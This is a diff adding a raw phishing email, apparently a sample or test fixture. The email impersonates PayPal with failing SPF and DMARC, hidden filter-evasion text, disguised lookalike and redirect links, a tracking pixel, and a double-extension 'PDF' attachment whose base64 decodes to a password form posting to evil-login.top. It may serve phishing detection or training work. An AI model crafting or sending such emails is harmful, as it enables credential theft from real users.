@@ -1,0 +1,50 @@
+Delivered-To: victim@example.com
+Received: from mail.paypa1-support.xyz (mail.paypa1-support.xyz [185.220.101.4])
+        by mx.google.com with ESMTPS id abc123
+        for <victim@example.com>; Mon, 19 Oct 2026 09:12:03 -0700 (PDT)
+Authentication-Results: mx.google.com;
+       dkim=none;
+       spf=softfail (google.com: domain of transitioning billing@paypa1-support.xyz does not designate 185.220.101.4 as permitted sender) smtp.mailfrom=billing@paypa1-support.xyz;
+       dmarc=fail (p=NONE sp=NONE dis=NONE) header.from=paypa1-support.xyz
+Return-Path: <bounce@mailer-77.ru>
+From: "PayPal Service <service@paypal.com>" <billing@paypa1-support.xyz>
+Reply-To: secure-team@protonmail.com
+To: victim@example.com
+Subject: Your account has been limited - action required within 24 hours
+Date: Mon, 19 Oct 2026 16:12:00 +0000
+Message-ID: <fake-001@paypa1-support.xyz>
+MIME-Version: 1.0
+Content-Type: multipart/mixed; boundary="MIXED"
+
+--MIXED
+Content-Type: multipart/alternative; boundary="ALT"
+
+--ALT
+Content-Type: text/plain; charset="utf-8"
+
+Dear Customer, your account has been suspended. Verify your account now: https://bit.ly/3xYzAbc
+
+--ALT
+Content-Type: text/html; charset="utf-8"
+
+<html><body>
+<div style="display:none;font-size:0">Lorem ipsum invoice receipt shipping newsletter unsubscribe order confirmation thank you for your purchase your package has shipped track your delivery here</div>
+<p>Dear Customer,</p>
+<p>We noticed unusual activity. Your account has been <b>suspended</b>. You must verify your account within 24 hours or it will be permanently closed.</p>
+<p><a href="http://www.google.com/url?q=https://paypa1-secure.top/login?id=88&amp;sa=D">https://www.paypal.com/signin</a></p>
+<p><a href="https://bit.ly/3xYzAbc">Confirm your password</a></p>
+<p><a href="http://185.220.101.4/update">Update billing information</a></p>
+<p><a href="https://xn--pypal-4ve.com/verify">Resolution Center</a></p>
+<p style="color:#ffffff">urgent security notice</p>
+<img src="https://tracker.paypa1-support.xyz/open.gif?u=victim" width="1" height="1">
+</body></html>
+
+--ALT--
+
+--MIXED
+Content-Type: text/html; name="Invoice_Statement.pdf.html"
+Content-Disposition: attachment; filename="Invoice_Statement.pdf.html"
+Content-Transfer-Encoding: base64
+
+PGh0bWw+PGJvZHk+PGZvcm0gYWN0aW9uPSJodHRwczovL2V2aWwtbG9naW4udG9wL2NvbGxlY3QiPjxpbnB1dCB0eXBlPSJwYXNzd29yZCIgbmFtZT0icCI+PC9mb3JtPjwvYm9keT48L2h0bWw+
+--MIXED--
